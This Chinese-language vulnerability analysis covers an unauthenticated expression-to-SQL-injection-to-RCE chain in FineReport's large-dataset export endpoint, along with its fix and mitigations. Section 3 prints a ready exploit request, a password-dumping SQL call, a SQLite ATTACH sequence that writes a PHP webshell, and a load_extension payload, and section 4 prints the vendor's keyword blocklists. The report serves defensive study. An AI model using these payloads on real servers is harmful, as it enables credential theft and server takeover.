# FineReport LargeDatasetExcelExport SQL注入漏洞详细分析报告

## 1. 漏洞概述

### 1.1 漏洞信息

| 属性 | 内容 |
|------|------|
| 漏洞名称 | FineReport LargeDatasetExcelExport SQL注入漏洞 |
| 影响版本 | FineReport 11.0 (修复前版本) |
| 漏洞类型 | SQL注入 → 远程代码执行 |
| 危害等级 | 高危 |
| 攻击路径 | `/webroot/decision/url/nx/largeds/export` |

### 1.2 漏洞描述

该漏洞存在于 FineReport 的大数据集 Excel 导出功能中。攻击者可以通过精心构造的请求参数，利用 FineReport 表达式解析器执行任意 SQL 语句。结合 SQLite 数据库特性，最终可实现远程代码执行。

## 2. 漏洞原理分析

### 2.1 攻击入口

漏洞入口位于 `NXController` 控制器中的 `largedsExcelExport` 和 `largedsExcelExportV9` 两个路由：

```java
// sources/com/fr/nx/app/web/controller/NXController.java:128-131
@RequestMapping(value = {URLConstants.LARGEDATASET_EXCELEXPORT}, method = {RequestMethod.POST})
public void largedsExcelExport(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception {
    LargeDatasetExcelExportHandler.HANDLER.handle(httpServletRequest, httpServletResponse);
}

// sources/com/fr/nx/app/web/controller/NXController.java:323-326
@RequestMapping(value = {URLConstants.LARGEDATASET_EXCELEXPORT_V9}, method = {RequestMethod.GET})
public void largedsExcelExportV9(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception {
    com.fr.nx.app.web.v9.handler.handler.largeds.LargeDatasetExcelExportHandler.HANDLER.handle(httpServletRequest, httpServletResponse);
}
```

**注意**：该接口使用 `@LoginStatusChecker(required = false)` 注解，表示**无需登录认证**即可访问。

### 2.2 参数处理流程

`LargeDatasetExcelExportHandler` 的 `initCreator` 方法处理请求参数：

```java
// sources/com/fr/nx/app/web/v9/handler/handler/largeds/LargeDatasetExcelExportHandler.java:66-94
private WorkbookDataCreator initCreator(Calculator calculator, HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, TemplateSessionIDInfo templateSessionIDInfo) throws Exception {
    // 第一个参数：__parameters__，JSON格式
    Map<String, Object> paramsMap = getParamsMap(WebUtils.getHTTPRequestParameter(httpServletRequest, "__parameters__"));

    // 第二个参数：params，XML格式
    LargeDatasetExcelExportJavaScript entity = getEntity(httpServletRequest);

    // ... 省略部分代码 ...

    // 第三个参数：functionParams，在dealParam中处理
    dealParam(directExcelExportModel, calculator, entity, httpServletRequest, templateSessionIDInfo, paramsMap);
}
```

三个关键参数：
1. **`__parameters__`** - JSON 格式，包含基本参数
2. **`params`** - XML 格式，包含导出配置（数据集名称、文件名、列名映射等）
3. **`functionParams`** - JSON 格式，包含参数值映射，**这是漏洞的关键点**

### 2.3 漏洞触发点

漏洞核心位于 `dealParam` 方法中的表达式求值逻辑：

```java
// sources/com/fr/nx/app/web/v9/handler/handler/largeds/LargeDatasetExcelExportHandler.java:111-137
private void dealParam(DirectExcelExportModel directExcelExportModel, Calculator calculator, LargeDatasetExcelExportJavaScript largeDatasetExcelExportJavaScript, HttpServletRequest httpServletRequest, TemplateSessionIDInfo templateSessionIDInfo, Map<String, Object> map) throws UtilEvalError {
    // 获取 functionParams 参数
    Map<String, Object> paramsMap = getParamsMap(WebUtils.getHTTPRequestParameter(httpServletRequest, ExportJavaScript.FUNCTION_PARAMS));
    ParameterProvider[] parameters = largeDatasetExcelExportJavaScript.getParameters();

    // ... 省略命名空间设置代码 ...

    for (Parameter parameter : parameterArrProviders2Parameter) {
        Object obj = map.get(parameter.getName());
        if (obj != null) {
            linkedHashMap.put(parameter.getName(), obj);
        } else {
            JSONObject jSONObject = (JSONObject) paramsMap.get(parameter.getName());
            if (jSONObject != null) {
                String strValueOf = String.valueOf(parameter.getValue());
                // 占位符替换
                for (Map.Entry<String, Object> entry : jSONObject.toMap().entrySet()) {
                    strValueOf = strValueOf.replaceAll(WIDGET_PREFIX + entry.getKey(), "\"" + entry.getValue().toString() + "\"");
                }
                // 关键漏洞点：直接调用 evalValue 执行表达式
                linkedHashMap.put(parameter.getName(), calculator.evalValue(strValueOf));
            } else if (parameter.getValue() instanceof Formula) {
                // 另一种触发方式：Formula 对象
                linkedHashMap.put(parameter.getName(), calculator.evalValue(String.valueOf(parameter.getValue())));
            } else {
                linkedHashMap.put(parameter.getName(), parameter.getValue());
            }
        }
    }
}
```

**漏洞根因**：
1. `functionParams` 参数可控
2. 参数值经过占位符替换后直接传入 `calculator.evalValue()` 执行
3. `evalValue` 使用 FRParser 解析表达式，支持调用内置函数（包括 SQL 函数）

### 2.4 表达式解析机制

`Calculator.evalValue()` 方法调用 FRParser 解析表达式：

```java
// sources/com/fr/script/Calculator.java:543-551
public Object evalValue(String str) throws UtilEvalError {
    if (StringUtils.isEmpty(str)) {
        return null;
    }
    try {
        return eval(FRParser.parse(str, this));
    } catch (ANTLRException e) {
        throw new UtilEvalError(e);
    }
}
```

FRParser 是 FineReport 的核心表达式解析器，使用 ANTLR 生成的递归下降解析器，支持：
- 算术表达式
- 函数调用
- 变量引用
- **SQL 函数**（位于 `com.fr.function` 包）

### 2.5 SQL 函数调用链

攻击者可通过表达式调用 `SQL` 函数，完整的调用栈如下：

```
at com.fr.data.core.db.dialect.base.key.create.executequery.DialectExecuteSecurityQueryKey.execute(DialectExecuteSecurityQueryKey.java:20)
at com.fr.data.core.db.dialect.AbstractDialect.execute(AbstractDialect.java:123)
at com.fr.data.core.db.dialect.DefaultDialect.executeQuery(DefaultDialect.java:670)
at com.fr.data.impl.AbstractDBDataModel.executeQuery(AbstractDBDataModel.java:-1)
at com.fr.data.impl.AbstractDBDataModel.initConnectionAndResultAndCheckInColumns(AbstractDBDataModel.java:-1)
at com.fr.data.impl.MemCachedDBDataModel.getValueAt(MemCachedDBDataModel.java:-1)
at com.fr.function.SQL.run(SQL.java:-1)
at com.fr.script.AbstractFunction.tryRun(AbstractFunction.java:-1)
at com.fr.parser.FunctionCall.eval(FunctionCall.java:-1)
at com.fr.script.Calculator.eval(Calculator.java:-1)
at com.fr.script.Calculator.evalValue(Calculator.java:-1)
at com.fr.nx.app.web.v9.handler.handler.largeds.LargeDatasetExcelExportHandler.dealParam(LargeDatasetExcelExportHandler.java:147)
```

SQL 函数实现：

```java
// sources/com/fr/function/SQL.java:34-77
@Override
public Object run(Object[] objArr) {
    if (objArr.length < 3) {
        return Primitive.ERROR_NAME;
    }
    String connectionName = GeneralUtils.objectToString(objArr[0]); // 数据库连接名
    String sqlQuery = GeneralUtils.objectToString(objArr[1]);       // SQL 查询语句
    int columnIndex = GeneralUtils.objectToNumber(objArr[2], false).intValue() - 1;
    // ... 执行 SQL 查询 ...
}
```

## 3. 漏洞利用

### 3.1 请求构造

攻击请求示例：

```http
POST /webroot/decision/url/nx/largeds/export?sessionID=xxx HTTP/1.1
Content-Type: application/x-www-form-urlencoded

__parameters__={"__filename__":"test"}&params=<LargeDatasetExcelExportJS dsName="ds1" exportFileName="test" colNames="{}"><Parameter name="p1" type="0"><![CDATA[SQL("db1","SELECT * FROM users",1,1)]]></Parameter></LargeDatasetExcelExportJS>&functionParams={"p1":{"$p1":"value"}}
```

### 3.2 利用方式

#### 3.2.1 信息泄露
通过 SQL 函数查询数据库敏感信息：
```
SQL("db1","SELECT password FROM users WHERE username='admin'",1,1)
```

#### 3.2.2 SQLite GetShell

当目标使用 SQLite 数据库时，可通过以下方式写入 WebShell：

**方式一：attach database 写文件**
```sql
ATTACH DATABASE '/webroot/shell.php' AS test;
CREATE TABLE test.shell (code TEXT);
INSERT INTO test.shell VALUES ('<?php @eval($_POST[cmd]);?>');
```

**方式二：启用 load_extension 加载恶意扩展**
```sql
SELECT load_extension('/path/to/malicious.dll');
```

### 3.3 攻击流程图

```
┌─────────────────────────────────────────────────────────────────┐
│                        攻击者                                    │
└──────────────────────────┬──────────────────────────────────────┘
                           │ 构造恶意请求
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                   NXController.largedsExcelExport               │
│                   (无需认证)                                      │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│              LargeDatasetExcelExportHandler.initCreator         │
│              解析 __parameters__, params, functionParams         │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                 LargeDatasetExcelExportHandler.dealParam        │
│                 占位符替换 → calculator.evalValue()              │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                     Calculator.evalValue                        │
│                     FRParser 解析表达式                          │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                        SQL.run()                                │
│                     执行 SQL 语句                                │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                     数据库执行 SQL                               │
│                  (SQL注入 → RCE)                                │
└─────────────────────────────────────────────────────────────────┘
```

## 4. 安全机制分析

### 4.1 现有防护措施

FineReport 实现了多层 SQL 注入防护：

#### 4.1.1 SQL 关键词过滤

```java
// sources/com/fr/decision/config/PreventSqlInjConfig.java:26-27
private static final String DEFAULT_FORBID_KEY = "\\b(?i)and\\b|\\b(?i)exec\\b|\\b(?i)insert\\b|\\b(?i)select\\b|\\b(?i)delete\\b|\\b(?i)update\\b|\\b(?i)count\\b|\\b(?i)chr\\b|\\b(?i)mid\\b|\\b(?i)master\\b|\\b(?i)truncate\\b|\\b(?i)char\\b|\\b(?i)declare\\b|\\b(?i)or\\b|\\b(?i)drop\\b|\\b(?i)create\\b|\\b(?i)alter\\b";
private static final String DEFAULT_SPECIAL_CHAR = "'|;|--";
```

#### 4.1.2 JDBC 安全检查器

```java
// sources/com/fr/cbb/dialect/security/JDBCSecurityChecker.java:32-38
public static void checkQuery(String query) throws SQLException {
    checkQuery(query, "");
}

public static void checkQuery(String query, String dbType) throws SQLException {
    checkQuery(query, InsecurityElementFactory.getSqlElements(dbType));
}
```

检查器会：
1. 移除特殊字符（逗号、分号、换行等）
2. 忽略引号和注释内容
3. 匹配危险关键词

```java
// sources/com/fr/cbb/dialect/security/JDBCSecurityChecker.java:70-81
private static String removeSpecialCharacters(String originalQuery) {
    if (StringUtils.isEmpty(originalQuery)) {
        return originalQuery;
    }
    String query = ignoreQuotesAndNotes(originalQuery.toLowerCase());
    StringBuilder result = new StringBuilder();
    for (int i = 0; i < query.length(); i++) {
        char nextChar = isSpecialCharacter(query.charAt(i)) ? ' ' : query.charAt(i);
        result.append(nextChar);
    }
    return result.toString();
}
```

#### 4.1.3 SQLite 特定防护

```java
// sources/com/fr/cbb/dialect/security/element/porvider/impl/SQLiteInsecurityElementProvider.java:12-14
@Override
protected void init() {
    register(InsecurityElementType.SQL_FUNCTION, "load_extension");
}
```

### 4.2 防护绕过

现有防护机制存在以下问题：

1. **过滤时机错误**：关键词过滤在 `SQL.run()` 内部执行，但攻击者通过表达式调用 SQL 函数时，传入的参数已经绕过了前端过滤。

2. **黑名单不完整**：默认黑名单未包含所有危险 SQL 语句，如 `ATTACH DATABASE`、`VACUUM` 等。

3. **表达式解析特权**：`Calculator.evalValue()` 的调用上下文具有较高权限，未对可调用的函数进行限制。

4. **@RestrictScript 注解未生效**：虽然 SQL 函数有 `@RestrictScript` 注解，但在大数据集导出场景下未能正确限制。

## 5. 修复方案分析

### 5.1 修复前代码（漏洞版本）

```java
// 漏洞版本：v9/handler/handler/largeds/LargeDatasetExcelExportHandler.java
private void dealParam(...) throws UtilEvalError {
    // ...
    if (jSONObject != null) {
        String strValueOf = String.valueOf(parameter.getValue());
        for (Map.Entry<String, Object> entry : jSONObject.toMap().entrySet()) {
            strValueOf = strValueOf.replaceAll(WIDGET_PREFIX + entry.getKey(), "\"" + entry.getValue().toString() + "\"");
        }
        // 直接执行用户可控的表达式
        linkedHashMap.put(parameter.getName(), calculator.evalValue(strValueOf));
    }
    // ...
}
```

### 5.2 修复后代码（当前版本）

当前版本的修复主要体现在以下几个方面：

#### 5.2.1 增强安全检查器

```java
// sources/com/fr/data/core/db/dialect/base/key/create/executequery/DialectExecuteSecurityQueryKey.java:12-20
@Override
public ResultSet execute(DialectExecuteQueryParameter dialectExecuteQueryParameter, Dialect current) throws SQLException {
    String sql = dialectExecuteQueryParameter.getSql();
    try {
        checkQuery(sql);  // 新增：执行前检查
        return dialectExecuteQueryParameter.getStatement().executeQuery(dialectExecuteQueryParameter.getSql());
    } catch (SQLException e) {
        throw new SQLException("DDL/DML query is not permitted for current database, or exist forbidden elements.");
    }
}

protected void checkQuery(String sql) throws SQLException {
    JDBCSecurityChecker.checkQuery(sql);  // 调用安全检查器
}
```

#### 5.2.2 扩展危险元素列表

```java
// sources/com/fr/cbb/dialect/security/InsecurityElementFactory.java:33
private static final InsecurityElement[] FORBIDDEN_ELEMENTS_OF_VALIDATION_QUERY = new InsecurityElement[]{
    new InsecuritySQLKeyword("insert"),
    new InsecuritySQLKeyword("merge"),
    new InsecuritySQLKeyword("attach"),    // 新增：防止 SQLite attach 攻击
    new InsecuritySQLKeyword("xp_dirtree"),
    new InsecuritySQLKeyword("VACUUM")
};
```

#### 5.2.3 参数处理增强

在 `SQL.java` 中增加了参数处理和转义：

```java
// sources/com/fr/function/SQL.java:79-88
@NotNull
private String dealWithParameters(String str) {
    Parameter[] parameterArrAnalyze4Parameters = ParameterHelper.analyze4Parameters(new String[]{SqlUtils.clearSqlComments(str)}, false);
    if (parameterArrAnalyze4Parameters.length == 0) {
        return str;
    }
    Parameter[] parameterArrProviders2Parameter = Parameter.providers2Parameter(Calculator.processParameters(getCalculatorProvider(), parameterArrAnalyze4Parameters));
    // 新增：参数转义处理
    EscapeSqlHelper.getInstance().processParametersBeforeAnalyzeSQL(parameterArrProviders2Parameter, getCalculatorProvider());
    return ParameterHelper.analyzeCurrentContextTableData4Templatee(str, parameterArrProviders2Parameter);
}
```

### 5.3 修复前后对比

| 方面 | 修复前 | 修复后 |
|------|--------|--------|
| SQL 执行前检查 | 无 | 调用 `JDBCSecurityChecker.checkQuery()` |
| 危险关键词 | 基础关键词 | 增加 `attach`、`merge`、`VACUUM` 等 |
| 参数处理 | 直接拼接 | 使用 `EscapeSqlHelper` 转义 |
| SQLite 防护 | 无 | 禁止 `load_extension` 函数 |
| 错误信息 | 直接返回 | 统一错误信息，避免信息泄露 |

### 5.4 安全建议

1. **输入验证**：对所有用户输入进行严格的白名单验证，而非仅依赖黑名单过滤。

2. **表达式沙箱**：限制 `Calculator.evalValue()` 可调用的函数范围，禁止在用户可控上下文中调用危险函数（如 SQL、EVAL 等）。

3. **权限分离**：大数据集导出功能应要求用户认证，并验证用户对数据集的访问权限。

4. **日志审计**：记录所有 SQL 执行请求，便于安全审计和入侵检测。

5. **最小权限原则**：数据库连接应使用最小必要权限，禁止写入文件等高危操作。

## 6. 总结

该漏洞是一个典型的"表达式注入 → SQL 注入 → RCE"攻击链。根本原因在于：

1. **未认证接口暴露敏感功能**：大数据集导出接口无需登录即可访问
2. **表达式解析器过度信任用户输入**：`calculator.evalValue()` 直接执行用户可控的表达式
3. **SQL 函数权限控制不足**：未限制在非安全上下文中调用 SQL 函数
4. **安全检查时机错误**：过滤机制未能覆盖表达式参数

修复后的版本通过增强安全检查器、扩展危险元素列表、改进参数处理等方式缓解了该漏洞，但仍建议用户：

- 及时升级到最新版本
- 限制数据库连接权限
- 启用 SQL 注入防护功能
- 部署 WAF 进行深度防护

## 附录

### A. 相关源码文件

| 文件路径 | 说明 |
|----------|------|
| `com/fr/nx/app/web/controller/NXController.java` | 路由控制器 |
| `com/fr/nx/app/web/v9/handler/handler/largeds/LargeDatasetExcelExportHandler.java` | 漏洞处理器 |
| `com/fr/nx/app/web/handler/export/largeds/LargeDatasetExcelExportHandler.java` | 另一版本处理器 |
| `com/fr/function/SQL.java` | SQL 函数实现 |
| `com/fr/script/Calculator.java` | 表达式计算器 |
| `com/fr/cbb/dialect/security/JDBCSecurityChecker.java` | JDBC 安全检查器 |
| `com/fr/decision/config/PreventSqlInjConfig.java` | SQL 注入防护配置 |

### B. 参考资料

- [FineReport 官方安全公告](https://help.fanruan.com/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLite Security](https://www.sqlite.org/security.html)